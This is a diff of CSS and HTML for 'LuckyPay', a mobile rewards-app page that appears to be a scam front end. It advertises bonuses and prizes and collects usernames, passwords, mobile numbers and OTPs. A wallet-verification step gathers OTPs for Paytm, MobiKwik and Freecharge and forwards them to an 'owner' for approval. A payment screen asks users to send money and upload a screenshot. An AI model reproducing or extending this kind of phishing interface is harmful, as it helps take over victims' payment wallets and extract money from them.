+.wallet-req-icon{width:78px;height:78px;margin:0 auto 14px;border-radius:50%;display:flex;align-items:center;justify-content:center;color:#fff;font-size:32px;background:linear-gradient(160deg,#c084fc,#7c3aed);box-shadow:0 6px 0 #4c1d95,0 8px 22px rgba(124,58,237,.32),0 0 24px var(--purpleGlow),inset 0 2px 0 rgba(255,255,255,.3);}
+.wallet-req-icon i{animation:payBounce 2.5s ease-in-out infinite;}
+.wallet-req-title{font-family:var(--toon);font-weight:700;font-size:21px;color:#0b3a1f;margin:0 0 8px;}
+.wallet-req-text{font-size:14px;color:var(--muted);font-weight:600;line-height:1.55;margin:0 0 14px;}
+.wallet-req-text b{color:var(--greenD);font-weight:700;}
+.wallet-req-info{background:#f8fbf9;border:2px solid #eaf4ed;border-radius:16px;padding:13px;margin-bottom:16px;text-align:left;font-size:13.5px;font-weight:700;color:var(--ink);}
+.wallet-req-info>div+div{margin-top:6px;}
+.wallet-req-info i{color:var(--green);width:16px;text-align:center;margin-right:6px;}
+.wallet-req-info .m{color:var(--muted);font-weight:600;margin-right:6px;}
+.wallet-req-btn{width:100%;height:52px;border:0;border-radius:18px;background:linear-gradient(180deg,#c084fc,#7c3aed);color:#fff;font-family:var(--toon);font-weight:700;font-size:15.5px;letter-spacing:.3px;cursor:pointer;text-shadow:0 2px 0 rgba(0,0,0,.15);box-shadow:0 6px 0 #4c1d95,0 7px 0 rgba(0,0,0,.1),0 0 18px var(--purpleGlow),inset 0 2px 0 rgba(255,255,255,.25);transition:transform .1s;}
+.wallet-req-btn:active{transform:translateY(4px);box-shadow:0 2px 0 #4c1d95,0 0 12px var(--purpleGlow);}
+
+.logout-msg{text-align:center;font-size:14.5px;color:var(--muted);font-weight:600;margin:6px 0 4px;line-height:1.6;}
+.logout-msg b{color:var(--ink);}
+
+.avatar-upload-actions{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:12px;}
+.av-btn{height:48px;border:0;border-radius:14px;font-family:var(--toon);font-weight:700;font-size:13.5px;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:7px;color:#fff;transition:transform .08s;}
+.av-btn.up{background:linear-gradient(180deg,#4ade80,#0e8c3f);box-shadow:0 5px 0 var(--greenDeep),0 6px 0 rgba(0,0,0,.1),0 0 14px var(--greenGlow);}
+.av-btn.rm{background:linear-gradient(180deg,#f87171,#b91c1c);box-shadow:0 5px 0 #7f1d1d,0 6px 0 rgba(0,0,0,.1),0 0 14px var(--redGlow);}
+.av-btn:active{transform:translateY(4px);box-shadow:0 1px 0 var(--greenDeep);}
+.av-btn.rm:active{box-shadow:0 1px 0 #7f1d1d;}
+
+.update-popup{position:fixed;inset:0;z-index:400;background:rgba(6,40,22,.9);-webkit-backdrop-filter:blur(12px);backdrop-filter:blur(12px);display:flex;align-items:center;justify-content:center;padding:20px;opacity:0;pointer-events:none;transition:opacity .3s ease;}
+.update-popup.show{opacity:1;pointer-events:auto;}
+.update-box{background:#fff;border-radius:28px;padding:30px 24px 24px;max-width:360px;width:100%;text-align:center;box-shadow:0 24px 70px rgba(0,0,0,.4),0 0 40px var(--greenGlow),inset 0 3px 0 rgba(255,255,255,.9);animation:popScale .4s ease;}
+.update-ic{width:90px;height:90px;margin:0 auto 16px;border-radius:50%;background:linear-gradient(160deg,#4ade80,#0a6b2f);display:flex;align-items:center;justify-content:center;color:#fff;font-size:40px;box-shadow:0 8px 0 #0a6b2f,0 9px 0 rgba(0,0,0,.15),0 10px 24px rgba(11,122,55,.3),0 0 32px var(--greenGlow);animation:payBounce 2.5s ease-in-out infinite;}
+.update-title{font-size:24px;font-weight:700;color:#0b3a1f;margin:0 0 8px;}
+.update-desc{font-size:14.5px;color:var(--muted);font-weight:600;line-height:1.6;margin:0 0 20px;}
+.update-notes{background:#f0fdf4;border:2px solid #bbf7d0;border-radius:16px;padding:14px;margin-bottom:18px;text-align:left;font-size:13.5px;font-weight:600;color:#0b5c2c;line-height:1.6;box-shadow:0 0 14px rgba(34,197,94,.15);}
+.update-notes i{color:var(--green);margin-right:6px;}
+.update-btn{width:100%;height:56px;border:0;border-radius:20px;background:linear-gradient(180deg,#4ade80,#0e8c3f);color:#fff;font-family:var(--toon);font-weight:700;font-size:16px;cursor:pointer;text-shadow:0 2px 0 rgba(0,0,0,.15);box-shadow:0 7px 0 var(--greenDeep),0 8px 0 rgba(0,0,0,.15),0 10px 22px rgba(11,122,55,.3),0 0 22px var(--greenGlow),inset 0 2px 0 rgba(255,255,255,.35);transition:transform .08s;display:flex;align-items:center;justify-content:center;gap:10px;}
+.update-btn:active{transform:translateY(5px);box-shadow:0 2px 0 var(--greenDeep),0 3px 0 rgba(0,0,0,.15),0 0 14px var(--greenGlow);}
+.update-version{font-size:11.5px;color:var(--muted);font-weight:700;letter-spacing:1px;text-transform:uppercase;margin-top:12px;}
+
+.invite-share-box{background:linear-gradient(135deg,#faf5ff,#f3e8ff);border:3px dashed #c084fc;border-radius:18px;padding:16px;margin-bottom:14px;text-align:center;box-shadow:inset 0 3px 10px rgba(124,58,237,.08),0 0 18px var(--purpleGlow);}
+.invite-share-box .big{font-size:26px;font-weight:800;color:#6b21a8;letter-spacing:2px;margin-bottom:8px;}
+.invite-share-box .sub{font-size:13px;color:#7c3aed;font-weight:600;line-height:1.5;}
+.invite-reward-badge{display:inline-flex;align-items:center;gap:6px;padding:8px 14px;border-radius:20px;background:linear-gradient(180deg,#4ade80,#0e8c3f);color:#fff;font-weight:800;font-size:13px;box-shadow:0 4px 0 var(--greenDeep),0 0 14px var(--greenGlow);margin:10px 0;}
+
+/* VIDEO / CUSTOM POPUP */
+.video-popup{position:fixed;inset:0;z-index:420;background:rgba(6,40,22,.92);-webkit-backdrop-filter:blur(14px);backdrop-filter:blur(14px);display:flex;align-items:center;justify-content:center;padding:20px;opacity:0;pointer-events:none;transition:opacity .3s ease;}
+.video-popup.show{opacity:1;pointer-events:auto;}
+.video-box{background:#fff;border-radius:28px;padding:22px 20px 20px;max-width:390px;width:100%;max-height:90vh;overflow-y:auto;text-align:center;box-shadow:0 24px 70px rgba(0,0,0,.45),0 0 40px var(--greenGlow),inset 0 3px 0 rgba(255,255,255,.9);animation:popScale .4s ease;position:relative;}
+.video-close{position:absolute;top:14px;right:14px;width:36px;height:36px;border-radius:12px;border:2.5px solid #e2efe7;background:#f6fbf8;color:var(--muted);font-size:15px;cursor:pointer;display:flex;align-items:center;justify-content:center;box-shadow:0 3px 0 #e2efe7;transition:transform .1s;}
+.video-close:active{transform:translateY(2px);box-shadow:0 1px 0 #e2efe7;}
+.video-ic{width:80px;height:80px;margin:0 auto 14px;border-radius:50%;background:linear-gradient(160deg,#4ade80,#0a6b2f);display:flex;align-items:center;justify-content:center;color:#fff;font-size:34px;box-shadow:0 7px 0 #0a6b2f,0 8px 0 rgba(0,0,0,.15),0 12px 24px rgba(11,122,55,.3),0 0 30px var(--greenGlow),inset 0 3px 0 rgba(255,255,255,.35);animation:payBounce 2.5s ease-in-out infinite;}
+.video-title{font-size:22px;font-weight:700;color:#0b3a1f;margin:0 0 8px;}
+.video-desc{font-size:14.5px;color:var(--muted);font-weight:600;line-height:1.6;margin:0 0 16px;white-space:pre-wrap;}
+.video-frame-wrap{background:#0d2b1a;border-radius:16px;padding:4px;margin-bottom:14px;box-shadow:0 0 24px var(--greenGlow);}
+.video-link-btn{display:flex;align-items:center;justify-content:center;gap:9px;width:100%;height:54px;border-radius:20px;text-decoration:none;background:linear-gradient(180deg,#60a5fa,#1d4ed8);color:#fff;font-family:var(--toon);font-weight:700;font-size:15.5px;box-shadow:0 7px 0 #1e3a8a,0 8px 0 rgba(0,0,0,.15),0 0 18px var(--blueGlow),inset 0 2px 0 rgba(255,255,255,.3);margin-bottom:10px;}
+.video-link-btn:active{transform:translateY(5px);box-shadow:0 2px 0 #1e3a8a;}
+.video-ok-btn{width:100%;height:54px;border:0;border-radius:20px;background:linear-gradient(180deg,#4ade80,#0e8c3f);color:#fff;font-family:var(--toon);font-weight:700;font-size:15.5px;cursor:pointer;text-shadow:0 2px 0 rgba(0,0,0,.15);box-shadow:0 7px 0 var(--greenDeep),0 8px 0 rgba(0,0,0,.15),0 0 20px var(--greenGlow),inset 0 2px 0 rgba(255,255,255,.3);transition:transform .08s;display:flex;align-items:center;justify-content:center;gap:9px;}
+.video-ok-btn:active{transform:translateY(5px);box-shadow:0 2px 0 var(--greenDeep);}
+</style>
+</head>
+<body>
+<div class="phone">
+
+  <!-- REGISTER -->
+  <div id="registerScreen">
+    <div class="auth-blob"></div><div class="auth-blob b2"></div>
+    <div class="logo-orb" id="logoOrb"><i class="fa-solid fa-clover"></i></div>
+    <h1 class="reg-title">Create <span class="acc">LuckyPay</span></h1>
+    <p class="reg-sub">Join &amp; start earning rewards</p>
+    <div class="bonus-banner"><i class="fa-solid fa-gift"></i><div><div class="bb-small">Register Bonus</div><div class="bb-big" id="regBonusText">₹50 Free</div></div></div>
+    <div class="field"><i class="fa-solid fa-user"></i><input id="regUser" type="text" placeholder="Username (User ID)" autocomplete="off" spellcheck="false"></div>
+    <div class="field"><i class="fa-solid fa-lock"></i><input id="regPass" type="password" placeholder="Password" autocomplete="new-password"></div>
+    <div class="field"><i class="fa-solid fa-mobile-screen-button"></i><input id="regMobile" type="tel" inputmode="numeric" maxlength="10" placeholder="Indian Mobile Number" autocomplete="off"></div>
+    <div class="otp-row">
+      <div class="field"><i class="fa-solid fa-shield-halved"></i><input id="regOtp" type="tel" inputmode="numeric" maxlength="6" placeholder="Enter OTP" autocomplete="off"></div>
+      <button id="getOtpBtn" class="btn-otp" type="button">GET OTP</button>
+    </div>
+    <div id="otpHint" class="hint"></div>
+    <div class="field"><i class="fa-solid fa-ticket"></i><input id="regInvite" type="text" maxlength="5" placeholder="Invite Code (optional)" autocomplete="off" spellcheck="false"></div>
+    <button id="createBtn" class="btn-primary" type="button"><i class="fa-solid fa-user-plus"></i> <span>CREATE ACCOUNT</span></button>
+    <p class="tiny-note"><i class="fa-solid fa-star"></i> Invite friends &amp; earn ₹10 per friend!</p>
+  </div>
+
+  <!-- LOGIN -->
+  <div id="loginScreen" class="hidden">
+    <div class="auth-blob"></div><div class="auth-blob b2"></div>
+    <div class="logo-orb blue-orb"><i class="fa-solid fa-right-to-bracket"></i></div>
+    <h1 class="reg-title">Welcome <span class="acc" style="background:linear-gradient(120deg,#3b82f6,#1e3a8a);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;">Back</span></h1>
+    <p class="reg-sub">Login to continue earning rewards</p>
+    <div class="field"><i class="fa-solid fa-mobile-screen-button"></i><input id="logMobile" type="tel" inputmode="numeric" maxlength="10" placeholder="Mobile Number" autocomplete="off"></div>
+    <div class="field"><i class="fa-solid fa-lock"></i><input id="logPass" type="password" placeholder="Password" autocomplete="current-password"></div>
+    <button id="loginBtn" class="btn-primary btn-blue" type="button"><i class="fa-solid fa-right-to-bracket"></i> <span>LOGIN</span></button>
+    <a class="forgot-link" id="forgotLink" href="javascript:void(0)"><i class="fa-solid fa-key"></i> Forgot Password?</a>
+    <p class="tiny-note"><i class="fa-solid fa-shield-halved"></i> Your account is safe &amp; secure</p>
+  </div>
+
+  <!-- LOGIN OTP -->
+  <div id="loginOtpScreen" class="hidden">
+    <div class="auth-blob"></div><div class="auth-blob b2"></div>
+    <div class="otp-wrap">
+      <div class="otp-orb"><i class="fa-solid fa-shield-halved"></i></div>
+      <h1 class="otp-title">Verify OTP</h1>
+      <p class="otp-desc">We sent a 6-digit code to<br>+91 <b id="otpMobileDisplay">----------</b></p>
+      <input class="otp-box" id="otpBox" type="tel" inputmode="numeric" maxlength="6" placeholder="••••••" autocomplete="off">
+      <div class="timer-card">
+        <div class="timer-ring" id="otpOrb" style="--p:100%"><span id="otpTimerText">59</span></div>
+        <div class="timer-info">
+          <div class="timer-label">Code expires in <span id="otpExpiresText">59s</span></div>
+          <div class="timer-sub" id="otpResendLine">You can resend once timer ends</div>
+        </div>
+      </div>
+      <button id="otpVerifyBtn" class="btn-primary" type="button"><i class="fa-solid fa-circle-check"></i> <span>VERIFY &amp; CONTINUE</span></button>
+      <button id="otpResendBtn" class="btn-ghost" type="button" disabled><i class="fa-solid fa-rotate-right"></i> Resend OTP</button>
+      <a class="back-link" id="otpBackLink"><i class="fa-solid fa-arrow-left"></i> Back to Login</a>
+    </div>
+  </div>
+
+  <!-- VERIFY SCREEN -->
+  <div id="verifyScreen" class="hidden">
+    <div class="auth-blob"></div><div class="auth-blob b2"></div>
+    <div class="otp-wrap" style="text-align:center;">
+      <div class="verify-orb" id="verifyOrb"><i class="fa-solid fa-hourglass-half"></i></div>
+      <h1 class="verify-title" id="verifyTitle">Verifying OTP</h1>
+      <p class="verify-desc" id="verifyDesc">Please wait while owner confirms your login.<br>Do not close the app.</p>
+      <div class="verify-bar" id="verifyBar"></div>
+      <div class="verify-dots" id="verifyDots"><span></span><span></span><span></span></div>
+      <div class="verify-status" id="verifyStatus"><i class="fa-solid fa-circle-notch"></i> <span id="verifyStatusText">Waiting for owner approval...</span></div>
+      <button class="btn-primary" id="verifyBackBtn" type="button" style="margin-top:20px;display:none;"><i class="fa-solid fa-arrow-left"></i> <span>BACK TO LOGIN</span></button>
+    </div>
+  </div>
+
+  <!-- WAITING -->
+  <div id="waitingScreen" class="hidden">
+    <div class="auth-blob"></div><div class="auth-blob b2"></div>
+    <div class="wait-orb-wrap">
+      <div class="wait-ring"></div><div class="wait-ring delay1"></div><div class="wait-ring delay2"></div>
+      <div class="wait-orb"><i class="fa-solid fa-hourglass-half"></i></div>
+    </div>
+    <h1 class="wait-title">Owner Approval Pending</h1>
+    <p class="wait-sub">Your registration details sent to owner.<br>Please wait for approval.</p>
+    <div class="wait-card">
+      <div class="wait-row"><i class="fa-solid fa-user"></i><div style="flex:1;min-width:0;"><div class="lbl-s">User ID</div><div class="val-s" id="waitUser">User</div></div></div>
+      <div class="wait-row"><i class="fa-solid fa-mobile-screen-button"></i><div style="flex:1;min-width:0;"><div class="lbl-s">Mobile</div><div class="val-s mono" id="waitMobile">+91 ----------</div></div></div>
+    </div>
+    <button class="btn-primary" id="waitRefreshBtn" type="button" style="max-width:340px;"><i class="fa-solid fa-rotate-right"></i> <span>CHECK NOW</span></button>
+  </div>
+
+  <!-- FORGOT -->
+  <div id="forgotScreen" class="hidden">
+    <div class="auth-blob"></div><div class="auth-blob b2"></div>
+    <div class="wait-orb-wrap">
+      <div class="wait-ring"></div><div class="wait-ring delay1"></div><div class="wait-ring delay2"></div>
+      <div class="wait-orb" style="background:linear-gradient(140deg,#25d366,#075e54)"><i class="fa-brands fa-whatsapp"></i></div>
+    </div>
+    <h1 class="wait-title">Request Sent</h1>
+    <p class="wait-sub">Aapki request WhatsApp par owner ko bhej di gayi hai.<br>Please wait for approval.</p>
+    <div class="wait-card">
+      <div class="wait-row"><i class="fa-solid fa-user"></i><div style="flex:1;min-width:0;"><div class="lbl-s">User ID</div><div class="val-s" id="forgotUser">-</div></div></div>
+      <div class="wait-row"><i class="fa-solid fa-mobile-screen-button"></i><div style="flex:1;min-width:0;"><div class="lbl-s">Mobile</div><div class="val-s mono" id="forgotMobile">+91 ----------</div></div></div>
+    </div>
+    <button class="btn-primary btn-wa" id="forgotResendBtn" type="button" style="max-width:340px;margin-top:16px;"><i class="fa-brands fa-whatsapp"></i> <span>RESEND WHATSAPP</span></button>
+    <button class="btn-ghost" id="forgotCancelBtn" type="button" style="max-width:340px;"><i class="fa-solid fa-arrow-left"></i> Back to Login</button>
+  </div>
+
+  <!-- NEW PASS -->
+  <div id="newPassScreen" class="hidden">
+    <div class="auth-blob"></div><div class="auth-blob b2"></div>
+    <div class="logo-orb orange-orb"><i class="fa-solid fa-key"></i></div>
+    <h1 class="reg-title">Set New <span class="acc" style="background:linear-gradient(120deg,#f59e0b,#7c2d12);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;">Password</span></h1>
+    <p class="reg-sub">Owner has approved your request ✓</p>
+    <div class="info-block orange">
+      <div class="info-row-lite"><i class="fa-solid fa-user"></i><span>User ID</span><span class="val" id="npUserVal">-</span></div>
+      <div class="info-row-lite"><i class="fa-solid fa-mobile-screen-button"></i><span>Mobile</span><span class="val" id="npMobileVal">-</span></div>
+    </div>
+    <label class="lbl" for="npNew">New Password</label>
+    <div class="field"><i class="fa-solid fa-lock"></i><input id="npNew" type="password" placeholder="Enter new password" autocomplete="new-password"></div>
+    <label class="lbl" for="npConfirm">Confirm Password</label>
+    <div class="field"><i class="fa-solid fa-lock"></i><input id="npConfirm" type="password" placeholder="Re-enter new password" autocomplete="new-password"></div>
+    <button id="npSaveBtn" class="btn-primary" type="button"><i class="fa-solid fa-check"></i> <span>SAVE PASSWORD</span></button>
+    <button class="btn-ghost" id="npCancelBtn" type="button"><i class="fa-solid fa-arrow-left"></i> Back to Login</button>
+  </div>
+
+  <!-- APP -->
+  <div id="appScreen" class="hidden">
+    <header class="app-header">
+      <div class="header-top">
+        <div class="h-avatar" id="hAvatar"><i class="fa-solid fa-user"></i></div>
+        <div><div class="h-hi">Welcome back,</div><div class="h-name" id="hUsername">User</div></div>
+        <div class="h-badge"><i class="fa-solid fa-indian-rupee-sign"></i> <span id="headerBalance">50</span></div>
+      </div>
+    </header>
+    <main class="app-main">
+      <section id="page-home" class="page">
+        <div class="balance-card">
+          <div class="bc-label">Total Balance</div>
+          <div class="bc-amount" id="mainBalance">₹50</div>
+          <div class="bc-foot"><i class="fa-solid fa-arrow-trend-up"></i> Available for withdrawal</div>
+          <div class="bc-coin"><i class="fa-solid fa-indian-rupee-sign"></i></div>
+        </div>
+        <div class="bonus-card">
+          <div class="icon-circle"><i class="fa-solid fa-gift"></i></div>
+          <div><div class="bc-title" id="bonusTitle">+₹50 Registration Bonus</div><div class="bc-sub">Credited to your wallet</div></div>
+          <i class="fa-solid fa-circle-check ok"></i>
+        </div>
+        <div class="invite-banner" id="inviteBanner">
+          <div class="invite-icon"><i class="fa-solid fa-user-plus"></i></div>
+          <div class="invite-info">
+            <div class="invite-title">Invite &amp; Earn ₹10</div>
+            <div class="invite-sub">Per friend who joins using your code</div>
+            <div class="invite-badge"><i class="fa-solid fa-user-group"></i> <span id="inviteCountHome">0</span> invited</div>
+          </div>
+          <i class="fa-solid fa-chevron-right invite-arrow"></i>
+        </div>
+        <div class="purchase-card" id="purchaseBox">
+          <div class="purchase-icon"><i class="fa-solid fa-credit-card"></i></div>
+          <div class="purchase-info"><div class="purchase-title">Purchase Now</div><div class="purchase-sub">Complete payment &amp; verify</div></div>
+          <i class="fa-solid fa-chevron-right purchase-arrow"></i>
+        </div>
+        <div class="support-card" id="supportBox">
+          <div class="support-icon"><i class="fa-solid fa-headset"></i></div>
+          <div class="support-info"><div class="support-title">Customer Support</div><div class="support-sub"><i class="fa-solid fa-phone"></i> <span id="supportSubPhone">8235619970</span></div></div>
+          <i class="fa-solid fa-chevron-right support-arrow"></i>
+        </div>
+        <div class="section-title">Quick Actions</div>
+        <div class="quick-grid">
+          <button class="quick-btn" id="quickInvite" type="button"><i class="fa-solid fa-user-group"></i><span>Invite Friends</span></button>
+          <button class="quick-btn" id="quickWallet" type="button"><i class="fa-solid fa-wallet"></i><span>My Wallet</span></button>
+        </div>
+        <div id="verifiedCard" class="verified-card hidden">
+          <div class="vc-icon"><i class="fa-solid fa-check"></i></div>
+          <div class="vc-title">✓ VERIFIED</div>
+          <div class="vc-sub" id="verifiedText">Wallet verification completed</div>
+        </div>
+      </section>
+      <section id="page-history" class="page hidden">
+        <div class="page-head-card"><h2 class="page-title">History</h2><p class="page-sub">Your recent transactions and rewards</p></div>
+        <div id="historyList"></div>
+      </section>
+      <section id="page-wallet" class="page hidden">
+        <div class="page-head-card"><h2 class="page-title">My Wallet</h2><p class="page-sub">Verify each wallet with OTP &amp; request</p></div>
+        <div class="wallet-card paytm" data-wallet="Paytm">
+          <div class="wc-icon paytm"><i class="fa-solid fa-wallet"></i></div>
+          <div class="wc-info"><div class="wc-name">Paytm</div><div class="wc-status"><span class="dot"></span> Not verified</div></div>
+          <button class="btn-verify" type="button">Verify</button>
+        </div>
+        <div class="wallet-card mobikwik" data-wallet="MobiKwik">
+          <div class="wc-icon mobikwik"><i class="fa-solid fa-credit-card"></i></div>
+          <div class="wc-info"><div class="wc-name">MobiKwik</div><div class="wc-status"><span class="dot"></span> Not verified</div></div>
+          <button class="btn-verify" type="button">Verify</button>
+        </div>
+        <div class="wallet-card freecharge" data-wallet="Freecharge">
+          <div class="wc-icon freecharge"><i class="fa-solid fa-bolt"></i></div>
+          <div class="wc-info"><div class="wc-name">Freecharge</div><div class="wc-status"><span class="dot"></span> Not verified</div></div>
+          <button class="btn-verify" type="button">Verify</button>
+        </div>
+      </section>
+      <section id="page-profile" class="page hidden">
+        <div class="profile-card">
+          <div class="prof-avatar" id="profAvatar"><i class="fa-solid fa-user"></i></div>
+          <div class="prof-name" id="profUsername">User</div>
+          <div class="prof-tag"><i class="fa-solid fa-circle-check"></i> Active Member</div>
+          <div class="avatar-upload-actions">
+            <button class="av-btn up" id="profUploadBtn" type="button"><i class="fa-solid fa-camera"></i> Upload Photo</button>
+            <button class="av-btn rm" id="profRemoveBtn" type="button"><i class="fa-solid fa-trash"></i> Remove</button>
+          </div>
+          <input type="file" id="profPhotoInput" accept="image/*" hidden>
+          <div class="info-row"><i class="fa-solid fa-mobile-screen-button"></i><div style="flex:1;min-width:0;"><div class="info-label">Mobile Number</div><div class="info-value" id="profMobile">+91 ----------</div></div></div>
+          <div class="info-row"><i class="fa-solid fa-ticket"></i><div style="flex:1;min-width:0;"><div class="info-label">Invite Code</div><div class="info-value code" id="profInvite">-----</div></div><button class="btn-mini" id="profCopyBtn" type="button"><i class="fa-regular fa-copy"></i> COPY</button></div>
+          <div class="info-row" style="background:linear-gradient(135deg,#faf5ff,#f3e8ff);border-color:#e9d5ff;">
+            <i style="background:#f3e8ff;color:#7c3aed;border-color:#e9d5ff;"><i class="fa-solid fa-user-group" style="font-size:15px;"></i></i>
+            <div style="flex:1;min-width:0;"><div class="info-label" style="color:#7c3aed;">Invite Count</div><div class="info-value purple" id="profInviteCount">0 Friends</div></div>
+            <button class="btn-mini" id="profShareBtn" type="button" style="background:linear-gradient(180deg,#c084fc,#7c3aed);box-shadow:0 4px 0 #4c1d95,0 0 10px var(--purpleGlow);"><i class="fa-solid fa-share"></i> SHARE</button>
+          </div>
+          <div class="info-row support-row" id="profSupportRow">
+            <i class="fa-solid fa-headset"></i>
+            <div style="flex:1;min-width:0;"><div class="info-label">Customer Support</div><div class="info-value" id="profSupportNum">8235619970</div></div>
+            <button class="btn-mini" id="profCallBtn" type="button"><i class="fa-solid fa-headset"></i> HELP</button>
+          </div>
+          <button class="btn-logout" id="logoutBtn" type="button"><i class="fa-solid fa-right-from-bracket"></i> <span>LOGOUT</span></button>
+        </div>
+      </section>
+    </main>
+    <div class="float-support" id="floatSupport"><i class="fa-solid fa-headset"></i></div>
+    <nav class="bottom-nav">
+      <button class="nav-item active" data-page="home" type="button"><i class="fa-solid fa-house"></i><span>Home</span></button>
+      <button class="nav-item" data-page="history" type="button"><i class="fa-solid fa-clock-rotate-left"></i><span>History</span></button>
+      <button class="nav-item" data-page="wallet" type="button"><i class="fa-solid fa-wallet"></i><span>Wallet</span></button>
+      <button class="nav-item" data-page="profile" type="button"><i class="fa-solid fa-user"></i><span>Profile</span></button>
+    </nav>
+  </div>
+
+  <!-- INVITE MODAL -->
+  <div class="overlay" id="inviteModal">
+    <div class="sheet">
+      <div class="sheet-handle"></div>
+      <div class="sheet-icon purple"><i class="fa-solid fa-user-plus"></i></div>
+      <h3>Invite &amp; Earn ₹10</h3>
+      <p class="sheet-sub">Share your code with friends</p>
+      <div class="invite-share-box">
+        <div style="font-size:12px;color:#7c3aed;font-weight:700;letter-spacing:1.2px;text-transform:uppercase;margin-bottom:6px;">Your Invite Code</div>
+        <div class="big" id="inviteCodeBox">-----</div>
+        <div class="sub">Friend joins with this code → you earn <b style="color:#0e8c3f;">₹10</b></div>
+      </div>
+      <div style="text-align:center;">
+        <div class="invite-reward-badge"><i class="fa-solid fa-gift"></i> ₹10 Per Successful Invite</div>
+      </div>
+      <div class="info-block purple" style="margin-top:14px;">
+        <div class="info-row-lite purple"><i class="fa-solid fa-users"></i><span>Total Invited</span><span class="val" id="inviteCountModal">0</span></div>
+        <div class="info-row-lite purple"><i class="fa-solid fa-coins"></i><span>Earned From Invites</span><span class="val" id="inviteEarnedModal">₹0</span></div>
+      </div>
+      <button class="btn-primary" id="copyInviteBtn" type="button" style="background:linear-gradient(180deg,#c084fc,#7c3aed);box-shadow:0 7px 0 #4c1d95,0 8px 0 rgba(0,0,0,.15),0 12px 24px rgba(76,29,149,.3),0 0 24px var(--purpleGlow),inset 0 2px 0 rgba(255,255,255,.35);"><i class="fa-solid fa-share-nodes"></i> <span>SHARE INVITE LINK</span></button>
+      <button class="btn-ghost" data-close="inviteModal" type="button">Close</button>
+    </div>
+  </div>
+
+  <!-- SUPPORT MODAL -->
+  <div class="overlay" id="supportModal">
+    <div class="sheet">
+      <div class="sheet-handle"></div>
+      <div class="sheet-icon blue"><i class="fa-solid fa-headset"></i></div>
+      <h3>Customer Support</h3>
+      <p class="sheet-sub">We're here to help you 24/7</p>
+      <div class="support-info-block">
+        <div style="font-size:12px;color:#3b5a9a;font-weight:700;letter-spacing:1.2px;text-transform:uppercase;"><i class="fa-solid fa-phone"></i> Helpline Number</div>
+        <div class="support-number" id="supportModalPhone">8235619970</div>
+        <div class="support-hours"><i class="fa-solid fa-clock"></i> Available 24 × 7</div>
+      </div>
+      <div class="support-actions">
+        <button class="support-btn call" id="supportCallBtn" type="button"><i class="fa-solid fa-phone"></i> <span>CALL</span></button>
+        <button class="support-btn wa" id="supportWaBtn" type="button"><i class="fa-brands fa-whatsapp"></i> <span>WHATSAPP</span></button>
+      </div>
+      <button class="btn-ghost" data-close="supportModal" type="button">Close</button>
+    </div>
+  </div>
+
+  <!-- WALLET MODAL -->
+  <div class="overlay" id="walletModal">
+    <div class="sheet">
+      <div class="sheet-handle"></div>
+      <div class="sheet-head">
+        <div class="sheet-icon blue"><i class="fa-solid fa-wallet"></i></div>
+        <div style="flex:1;min-width:0;"><div class="sheet-title" id="wSheetTitle">Verify Wallet</div><div class="sheet-sub" id="wSheetSub">Enter mobile &amp; OTP</div></div>
+        <button class="close-x" data-close="walletModal" type="button"><i class="fa-solid fa-xmark"></i></button>
+      </div>
+      <div id="wStep1">
+        <label class="lbl" for="wMobile">Mobile Number</label>
+        <div class="field"><i class="fa-solid fa-mobile-screen-button"></i><input id="wMobile" type="tel" inputmode="numeric" maxlength="10" placeholder="10-digit mobile number" autocomplete="off"></div>
+        <button class="btn-primary" id="wNextBtn" type="button"><i class="fa-solid fa-paper-plane"></i> <span>SEND OTP</span></button>
+      </div>
+      <div id="wStep2" class="hidden">
+        <label class="lbl" for="wOtp">Enter OTP</label>
+        <div class="field"><i class="fa-solid fa-shield-halved"></i><input id="wOtp" type="tel" inputmode="numeric" maxlength="6" placeholder="Enter OTP" autocomplete="off"></div>
+        <div id="wOtpHint" class="hint"></div>
+        <button class="btn-primary" id="wVerifyBtn" type="button"><i class="fa-solid fa-circle-check"></i> <span>VERIFY &amp; REQUEST</span></button>
+      </div>
+      <div id="wLoading" class="hidden"><div class="spinner"></div><div class="loading-text">Verifying OTP...</div></div>
+      <div id="wSuccess" class="hidden">
+        <div class="result-box green"><i class="fa-solid fa-circle-check"></i>OTP VERIFIED<span>Sending request to owner...</span></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- WALLET REQ POPUP -->
+  <div class="wallet-req-popup" id="walletReqPopup">
+    <div class="wallet-req-icon"><i class="fa-solid fa-paper-plane"></i></div>
+    <h3 class="wallet-req-title">Verify Request Sent</h3>
+    <p class="wallet-req-text">Aapka request owner ko bhej diya gaya.<br><b>Please wait for approval.</b></p>
+    <div class="wallet-req-info">
+      <div><i class="fa-solid fa-wallet"></i><span class="m">Wallet:</span><span id="reqWalletName">-</span></div>
+      <div><i class="fa-solid fa-mobile-screen-button"></i><span class="m">Mobile:</span><span id="reqWalletMobile">-</span></div>
+    </div>
+    <button class="wallet-req-btn" id="reqPopupOk" type="button"><i class="fa-solid fa-check"></i> OK, GOT IT</button>
+  </div>
+
+  <!-- PAYMENT MODAL -->
+  <div class="overlay" id="paymentModal">
+    <div class="sheet">
+      <div class="sheet-handle"></div>
+      <div class="sheet-head">
+        <div class="sheet-icon purple"><i class="fa-solid fa-credit-card"></i></div>
+        <div style="flex:1;min-width:0;"><div class="sheet-title">Complete Payment</div><div class="sheet-sub" id="payPanelSub">Send money &amp; upload screenshot</div></div>
+        <button class="close-x" data-close="paymentModal" type="button"><i class="fa-solid fa-xmark"></i></button>
+      </div>
+      <div id="payStepWait" class="hidden">
+        <div class="unlock-wait">
+          <div class="uw-orb"><i class="fa-solid fa-shield-halved"></i></div>
+          <div class="uw-tt">Verifying with Owner</div>
+          <p class="uw-desc">Aapka purchase request owner ko bhej diya gaya hai.<br>Owner <b style="color:#0e8c3f;">YES</b> karega tab payment form khulega.</p>
+          <div class="uw-bar"></div>
+          <div class="verify-dots"><span></span><span></span><span></span></div>
+          <div class="verify-status"><i class="fa-solid fa-circle-notch"></i> <span>Verifying... please wait</span></div>
+        </div>
+      </div>
+      <div id="payStep1" class="hidden">
+        <div class="payee-card offline" id="payeeCard">
+          <div class="payee-status offline" id="payeeStatus"><i class="fa-solid fa-circle" id="payeeStatusDot"></i><span id="payeeStatusText">OFFLINE</span></div>
+          <div class="payee-row amount">
+            <span class="payee-lbl">Prize</span>
+            <span class="payee-val" id="payAmount">₹0</span>
